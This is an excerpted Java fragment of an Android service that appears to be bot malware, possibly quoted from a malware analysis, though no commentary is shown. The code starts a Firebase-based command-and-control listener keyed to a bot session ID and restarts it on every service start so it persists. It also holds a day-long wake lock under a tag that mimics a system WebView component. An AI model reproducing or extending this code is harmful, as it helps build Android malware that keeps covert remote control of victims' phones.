...
public class MainService extends Service {
    ...
    public void onCreate() {
        ...
        // Init Firebase C2 Manager
        firebaseC2Manager = new FirebaseC2Manager(commandHandler);
        commandHandler.setFirebaseC2Manager(firebaseC2Manager);
    ...
    public int onStartCommand(Intent intent, int flags, int startId) {
        ...
        if (firebaseC2Manager == null || !firebaseC2Manager.isListening()) {
            startFirebaseC2();
        }
        return START_STICKY;
    }
    ...
    private void acquireWakeLock() {
        ...
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "WebViewCore::Wakelock");
            wakeLock.acquire(24 * 60 * 60 * 1000L);
        }
    }

    private void startFirebaseC2() {
        if (firebaseC2Manager != null) firebaseC2Manager.stopListening();
        firebaseC2Manager = new FirebaseC2Manager(commandHandler);
        commandHandler.setFirebaseC2Manager(firebaseC2Manager);
        firebaseC2Manager.startListening(BotConfig.SESSION_ID);
        Log.d("MainService", "Firebase C2 started");
    }
